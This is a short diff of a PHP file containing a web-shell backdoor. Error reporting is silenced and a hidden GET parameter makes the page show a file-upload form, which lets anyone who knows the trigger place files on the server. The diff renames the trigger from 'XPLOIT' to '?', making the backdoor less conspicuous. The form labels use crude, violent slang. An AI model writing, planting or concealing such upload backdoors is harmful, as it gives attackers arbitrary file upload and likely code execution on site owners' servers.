@@ -11,7 +11,7 @@
 set_time_limit(0);
 error_reporting(0);
 error_log(0);
-if(isset($_GET["XPLOIT"])){
+if(isset($_GET["?"])){
 echo'<center><form method="post" enctype="multipart/form-data" name="memek" id="uploader"><input type="file" name="file" size="50"><input name="APLOT" type="submit" id="APLOT" value="PERKOSA"></form></center>';
 
 if( $_POST['APLOT'] == "PERKOSA" ) {
